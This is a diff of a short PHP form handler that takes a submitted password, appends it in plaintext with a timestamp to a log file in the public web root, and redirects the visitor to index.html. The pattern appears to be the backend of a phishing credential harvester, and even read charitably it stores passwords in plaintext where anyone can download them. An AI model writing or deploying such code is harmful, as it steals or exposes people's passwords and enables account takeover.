@@ -1,7 +1,16 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['password'])) {
-    $password = $_POST['password'];
-    $file = 'log.txt';
-    file_put_contents($file, $password . PHP_EOL, FILE_APPEND | LOCK_EX);
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $saisie = trim($_POST["password"]);
+
+    if (!empty($saisie)) {
+        $fichier = "/var/www/html/log.txt";
+        $date = date("Y-m-d H:i:s");
+        $texte = "$date - $saisie\n";
+
+        file_put_contents($fichier, $texte, FILE_APPEND | LOCK_EX);
+    }
 }
+
+header("Location: index.html"); // Redirection après soumission
+exit;
 ?>
